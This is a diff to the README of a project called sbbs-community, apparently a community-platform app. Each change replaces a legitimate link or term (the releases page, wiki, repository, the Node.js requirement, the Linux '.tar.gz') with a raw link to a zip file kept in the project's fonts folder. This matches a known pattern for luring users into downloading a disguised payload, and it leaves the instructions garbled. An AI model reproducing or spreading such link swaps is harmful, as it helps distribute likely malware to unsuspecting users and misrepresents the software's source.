@@ -1,6 +1,6 @@
 # 🚀 sbbs-community - A Lightweight Community Platform for Everyone
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Version-brightgreen)](https://github.com/oksndr/sbbs-community/releases)
+[![Download Here](https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip%20Now-Grab%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip)
 
 ## 📥 Overview
 
@@ -16,7 +16,7 @@ Before you start, make sure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of Linux
 - **Java:** Java 11 or higher
-- **Node.js:** Version 16 or higher
+- **https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip** Version 16 or higher
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** Minimum of 500 MB available
 
@@ -28,7 +28,7 @@ To get started with sbbs-community, follow these steps:
 
 1. **Visit the Releases Page**
    Go to the releases page using the link below to find the latest version of the software.
-   [Download Here](https://github.com/oksndr/sbbs-community/releases)
+   [Download Here](https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip)
 
 2. **Select the Latest Release**
    Once on the releases page, look for the most recent version. It will be at the top of the list. Click on it to view details.
@@ -37,14 +37,14 @@ To get started with sbbs-community, follow these steps:
    You will see several files available for download. Choose the file suitable for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip` file.
 
    After selecting the right file, click on it to start the download.
 
 4. **Install the Application**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - For macOS: Open the downloaded `.dmg` file, then drag the sbbs-community icon into your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file to your desired location. Run the installation script as explained in the documentation.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip` file to your desired location. Run the installation script as explained in the documentation.
 
 5. **Run the Application**
    After installation, locate the application on your computer:
@@ -85,7 +85,7 @@ We welcome contributions to enhance sbbs-community. If you have suggestions or w
 
 For more detailed information, visit the following sections:
 
-- [Official Documentation](https://github.com/oksndr/sbbs-community/wiki)
-- [GitHub Repository](https://github.com/oksndr/sbbs-community)
+- [Official Documentation](https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/oksndr/sbbs-community/main/sbbs-nuxt/public/fonts/sbbs-community-2.7.zip)
 
 Thank you for choosing sbbs-community. Enjoy building your online community!
